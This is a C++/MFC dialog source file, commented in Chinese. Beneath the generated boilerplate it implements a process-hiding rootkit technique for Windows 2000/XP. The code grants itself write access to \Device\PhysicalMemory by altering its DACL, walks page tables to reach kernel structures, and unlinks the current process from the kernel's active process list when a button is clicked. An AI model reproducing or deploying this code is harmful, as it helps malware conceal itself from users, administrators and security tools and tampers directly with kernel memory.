// hideproc2Dlg.cpp : implementation file
//

#include "stdafx.h"
#include "hideproc2.h"
#include "hideproc2Dlg.h"

#ifdef _DEBUG
#define new DEBUG_NEW
#undef THIS_FILE
static char THIS_FILE[] = __FILE__;
#endif

/////////////////////////////////////////////////////////////////////////////
// CAboutDlg dialog used for App About

class CAboutDlg : public CDialog
{
public:
	CAboutDlg();

// Dialog Data
	//{{AFX_DATA(CAboutDlg)
	enum { IDD = IDD_ABOUTBOX };
	//}}AFX_DATA

	// ClassWizard generated virtual function overrides
	//{{AFX_VIRTUAL(CAboutDlg)
	protected:
	virtual void DoDataExchange(CDataExchange* pDX);    // DDX/DDV support
	//}}AFX_VIRTUAL

// Implementation
protected:
	//{{AFX_MSG(CAboutDlg)
	//}}AFX_MSG
	DECLARE_MESSAGE_MAP()
};

CAboutDlg::CAboutDlg() : CDialog(CAboutDlg::IDD)
{
	//{{AFX_DATA_INIT(CAboutDlg)
	//}}AFX_DATA_INIT
}

void CAboutDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialog::DoDataExchange(pDX);
	//{{AFX_DATA_MAP(CAboutDlg)
	//}}AFX_DATA_MAP
}

BEGIN_MESSAGE_MAP(CAboutDlg, CDialog)
	//{{AFX_MSG_MAP(CAboutDlg)
		// No message handlers
	//}}AFX_MSG_MAP
END_MESSAGE_MAP()

/////////////////////////////////////////////////////////////////////////////
// CHideproc2Dlg dialog

CHideproc2Dlg::CHideproc2Dlg(CWnd* pParent /*=NULL*/)
	: CDialog(CHideproc2Dlg::IDD, pParent)
{
	//{{AFX_DATA_INIT(CHideproc2Dlg)
		// NOTE: the ClassWizard will add member initialization here
	//}}AFX_DATA_INIT
	// Note that LoadIcon does not require a subsequent DestroyIcon in Win32
	m_hIcon = AfxGetApp()->LoadIcon(IDR_MAINFRAME);
}

void CHideproc2Dlg::DoDataExchange(CDataExchange* pDX)
{
	CDialog::DoDataExchange(pDX);
	//{{AFX_DATA_MAP(CHideproc2Dlg)
		// NOTE: the ClassWizard will add DDX and DDV calls here
	//}}AFX_DATA_MAP
}

BEGIN_MESSAGE_MAP(CHideproc2Dlg, CDialog)
	//{{AFX_MSG_MAP(CHideproc2Dlg)
	ON_WM_SYSCOMMAND()
	ON_WM_PAINT()
	ON_WM_QUERYDRAGICON()
	ON_BN_CLICKED(IDC_BUTTON1, OnButton1)
	//}}AFX_MSG_MAP
END_MESSAGE_MAP()

/////////////////////////////////////////////////////////////////////////////
// CHideproc2Dlg message handlers

BOOL CHideproc2Dlg::OnInitDialog()
{
	CDialog::OnInitDialog();

	// Add "About..." menu item to system menu.

	// IDM_ABOUTBOX must be in the system command range.
	ASSERT((IDM_ABOUTBOX & 0xFFF0) == IDM_ABOUTBOX);
	ASSERT(IDM_ABOUTBOX < 0xF000);

	CMenu* pSysMenu = GetSystemMenu(FALSE);
	if (pSysMenu != NULL)
	{
		CString strAboutMenu;
		strAboutMenu.LoadString(IDS_ABOUTBOX);
		if (!strAboutMenu.IsEmpty())
		{
			pSysMenu->AppendMenu(MF_SEPARATOR);
			pSysMenu->AppendMenu(MF_STRING, IDM_ABOUTBOX, strAboutMenu);
		}
	}

	// Set the icon for this dialog.  The framework does this automatically
	//  when the application's main window is not a dialog
	SetIcon(m_hIcon, TRUE);			// Set big icon
	SetIcon(m_hIcon, FALSE);		// Set small icon
	
	// TODO: Add extra initialization here
	
	return TRUE;  // return TRUE  unless you set the focus to a control
}

void CHideproc2Dlg::OnSysCommand(UINT nID, LPARAM lParam)
{
	if ((nID & 0xFFF0) == IDM_ABOUTBOX)
	{
		CAboutDlg dlgAbout;
		dlgAbout.DoModal();
	}
	else
	{
		CDialog::OnSysCommand(nID, lParam);
	}
}

// If you add a minimize button to your dialog, you will need the code below
//  to draw the icon.  For MFC applications using the document/view model,
//  this is automatically done for you by the framework.

void CHideproc2Dlg::OnPaint() 
{
	if (IsIconic())
	{
		CPaintDC dc(this); // device context for painting

		SendMessage(WM_ICONERASEBKGND, (WPARAM) dc.GetSafeHdc(), 0);

		// Center icon in client rectangle
		int cxIcon = GetSystemMetrics(SM_CXICON);
		int cyIcon = GetSystemMetrics(SM_CYICON);
		CRect rect;
		GetClientRect(&rect);
		int x = (rect.Width() - cxIcon + 1) / 2;
		int y = (rect.Height() - cyIcon + 1) / 2;

		// Draw the icon
		dc.DrawIcon(x, y, m_hIcon);
	}
	else
	{
		CDialog::OnPaint();
	}
}

// The system calls this to obtain the cursor to display while the user drags
//  the minimized window.
HCURSOR CHideproc2Dlg::OnQueryDragIcon()
{
	return (HCURSOR) m_hIcon;
}

BOOL CHideproc2Dlg::InitNTDLL()//初始化,加载相关DLL,并且获得相应函数的函数指针
{
	//返回得到的模块句柄,可以加载一个动态连接库或exe文件
    g_hNtDLL = LoadLibrary("ntdll.dll");

    if (NULL == g_hNtDLL)
        return FALSE;
	//用来获取RtlInitUnicodeString的入口
    RtlInitUnicodeString = (RTLINITUNICODESTRING)GetProcAddress( g_hNtDLL, 
		
		"RtlInitUnicodeString");
    ZwOpenSection = (ZWOPENSECTION)GetProcAddress( g_hNtDLL, "ZwOpenSection");

	return TRUE;

}

void CHideproc2Dlg::CloseNTDLL()//和初始化对应,进行相应的收尾工作(关闭动态链接库)
{
	//释放动态连接库
    if(NULL != g_hNtDLL)
        FreeLibrary(g_hNtDLL);
	
    g_hNtDLL = NULL;
}



void CHideproc2Dlg::SetPhyscialMemorySectionCanBeWrited(HANDLE hSection)//更改当前进程的session,使当前进程具有读写对应核心对象的权限
{
    PACL pDacl                    = NULL; 
    PSECURITY_DESCRIPTOR pSD    = NULL; 
    PACL pNewDacl = NULL; //获得当前进程对应的DACL
    
    DWORD dwRes = GetSecurityInfo(hSection, SE_KERNEL_OBJECT, DACL_SECURITY_INFORMATION, NULL, 
		
		NULL, &pDacl, NULL, &pSD);
	
    if(ERROR_SUCCESS != dwRes)
    {
		
		if(pSD) 
			LocalFree(pSD); 
		if(pNewDacl) 
			LocalFree(pNewDacl); 
    }
	
    EXPLICIT_ACCESS ea; 
    RtlZeroMemory(&ea, sizeof(EXPLICIT_ACCESS)); 
    ea.grfAccessPermissions = SECTION_MAP_WRITE; 
    ea.grfAccessMode = GRANT_ACCESS; 
    ea.grfInheritance= NO_INHERITANCE; 
    ea.Trustee.TrusteeForm = TRUSTEE_IS_NAME; 
    ea.Trustee.TrusteeType = TRUSTEE_IS_USER; 
    ea.Trustee.ptstrName = "CURRENT_USER"; 
	
    dwRes = SetEntriesInAcl(1,&ea,pDacl,&pNewDacl);
    
    if(ERROR_SUCCESS != dwRes)
    {
		
		if(pSD) 
			LocalFree(pSD); 
		if(pNewDacl) 
			LocalFree(pNewDacl); 
    }
    dwRes = SetSecurityInfo
		//增加一个CURRENT_USER的ACE
		(hSection,SE_KERNEL_OBJECT,DACL_SECURITY_INFORMATION,NULL,NULL,pNewDacl,NULL);
    
    if(ERROR_SUCCESS != dwRes)
    {
		
		if(pSD) 
			LocalFree(pSD); 
		if(pNewDacl) 
			LocalFree(pNewDacl); 
    }
}

HANDLE CHideproc2Dlg::OpenPhysicalMemory()//打开所需的物理内存映象
{
    NTSTATUS status;
    UNICODE_STRING physmemString;
    OBJECT_ATTRIBUTES attributes;
    ULONG PhyDirectory;
	
    g_osvi.dwOSVersionInfoSize = sizeof(OSVERSIONINFO);
    GetVersionEx (&g_osvi);
	
    if (5 != g_osvi.dwMajorVersion)
        return NULL;//判断系统版本
	
    switch(g_osvi.dwMinorVersion)//0x30000和0x3900分别是2k系统和xp系统页目录的内存地址所在的寄存器的内存地址
    {
	case 0:
		PhyDirectory = 0x30000;
		break; //2k系统
	case 1:
		PhyDirectory = 0x39000;
		break; //xp系统
	default:
		return NULL;
    }
	//RtlInitUnicodeString用UNICODE串初始化UNICODE描述的结构(windows的内核是基于Unicode的,所以需要将该描述字符串转换成Unicode格式
    RtlInitUnicodeString(&physmemString, L"\\Device\\PhysicalMemory");
	
    attributes.Length                    = sizeof(OBJECT_ATTRIBUTES);
    attributes.RootDirectory            = NULL;
    attributes.ObjectName                = &physmemString;
    attributes.Attributes                = 0;
    attributes.SecurityDescriptor        = NULL;
    attributes.SecurityQualityOfService    = NULL;
	//ZwOpenSection打开内核对象
    status = ZwOpenSection(&g_hMPM, SECTION_MAP_READ|SECTION_MAP_WRITE, &attributes); 
	
    if(status == STATUS_ACCESS_DENIED)
    { 
        status = ZwOpenSection(&g_hMPM, READ_CONTROL|WRITE_DAC, &attributes); 
        SetPhyscialMemorySectionCanBeWrited(g_hMPM); //在当前进程权限不足的时候提升当前进程权限
        CloseHandle(g_hMPM);
        status = ZwOpenSection(&g_hMPM, SECTION_MAP_READ|SECTION_MAP_WRITE, &attributes); 
    }
	
    if(!NT_SUCCESS(status)) 
        return NULL;
	//MapViewOfFile映射所需物理内存块
    g_pMapPhysicalMemory = MapViewOfFile(g_hMPM, FILE_MAP_READ|FILE_MAP_WRITE, 0, PhyDirectory, 
		
		0x1000);
	
    if( g_pMapPhysicalMemory == NULL )
        return NULL;
	
    return g_hMPM;
}
//把线性地址转换成物理地址(g_pMapPhysicalMemory是全局变量,是页目录表的内存映象
PVOID CHideproc2Dlg::LinearToPhys(PULONG BaseAddress, PVOID addr)
{
    ULONG VAddr = (ULONG)addr,PGDE,PTE,PAddr;
    PGDE = BaseAddress[VAddr>>22];//在页目录表中获得相应页表的地址
	
    if (0 == (PGDE&1))//判断页表项是否无效
        return 0;
	
    ULONG tmp = PGDE & 0x00000080;
	
    if (0 != tmp)//由页表属性位第七位判断是否为比一般页大的内存页,large page有4M大,可以直接访问而不必分页
    {
        PAddr = (PGDE & 0xFFC00000) + (VAddr & 0x003FFFFF);
    }
    else
    {//获取对应页表中所指向的内存
        PGDE = (ULONG)MapViewOfFile(g_hMPM, 4, 0, PGDE & 0xfffff000, 0x1000);
        PTE = ((PULONG)PGDE)[(VAddr&0x003FF000)>>12];
        
        if (0 == (PTE&1))
            return 0;
		
        PAddr=(PTE&0xFFFFF000)+(VAddr&0x00000FFF);
        UnmapViewOfFile((PVOID)PGDE);
    }
	
    return (PVOID)PAddr;//返回对应的物理地址
}

ULONG CHideproc2Dlg::GetData(PVOID addr)//获得所需的物理内存
{  
	//把线性地址转化为物理地址
    ULONG phys = (ULONG)LinearToPhys((PULONG)g_pMapPhysicalMemory, (PVOID)addr);
    //将所需的物理内存中的内容映射到当前进程的内存中
	PULONG tmp = (PULONG)MapViewOfFile(g_hMPM, FILE_MAP_READ|FILE_MAP_WRITE, 0, phys & 
		
		0xfffff000, 0x1000);//读取数据
    
    if (0 == tmp)
        return 0;
	
    ULONG ret = tmp[(phys & 0xFFF)>>2];
    UnmapViewOfFile(tmp);//取消地址空间映射
	
    return ret;//返回结果
}

BOOL CHideproc2Dlg::SetData(PVOID addr, ULONG data)//更改所需的数据
{
    ULONG phys = (ULONG)LinearToPhys((PULONG)g_pMapPhysicalMemory, (PVOID)addr);
    PULONG tmp = (PULONG)MapViewOfFile(g_hMPM, FILE_MAP_WRITE, 0, phys & 0xfffff000, 0x1000);
	
    if (0 == tmp)
        return FALSE;
	
    tmp[(phys & 0xFFF)>>2] = data;
    UnmapViewOfFile(tmp);
	
    return TRUE;
}

BOOL CHideproc2Dlg::YHideProcess()//隐藏进程
{
	//    SetUnhandledExceptionFilter(exeception);
	
    if (FALSE == InitNTDLL())//初始化,加载相关DLL
        return FALSE;
	
    if (0 == OpenPhysicalMemory())//打开对应的系统内存,并且映射为一个核心对象
        return FALSE;
	
    ULONG thread  = GetData((PVOID)0xFFDFF124); //kteb这是Current Thread block的数据块KTHREAD
    ULONG process = GetData(PVOID(thread + 0x44)); //kpeb从KTHREAD数据块中获得指向当前进程的EPROCESS数据块的指针
	
    ULONG fw, bw;//对Windows的系统版本的判断,并且根据不同的系统确定EPROCESS块中两个指针FLINK和BLINK的偏移位置
    if (0 == g_osvi.dwMinorVersion)
    {
        fw = GetData(PVOID(process + 0xa0));
        bw = GetData(PVOID(process + 0xa4));        
    }
	
    if (1 == g_osvi.dwMinorVersion)
    {
        fw = GetData(PVOID(process + 0x88));
        bw = GetData(PVOID(process + 0x8c));
    }
	
    SetData(PVOID(fw + 4), bw);//更改进程活动链的更改,让进程跳过当前进程的EPROCESS块
    SetData(PVOID(bw), fw);
	
    CloseHandle(g_hMPM);//关闭核心对象
    CloseNTDLL();//关闭DLL
	
    return TRUE;
}

BOOL CHideproc2Dlg::HideProcess()
{
	HMODULE g_hNtDLL = NULL;
	PVOID g_pMapPhysicalMemory = NULL;
	HANDLE g_hMPM = NULL;

	static BOOL b_hide = false;
	if (!b_hide)
	{
		b_hide = true;
		YHideProcess();
		return true;
	}
	return true;
}

void CHideproc2Dlg::OnButton1() 
{
	// TODO: Add your control notification handler code here
	HideProcess();
}
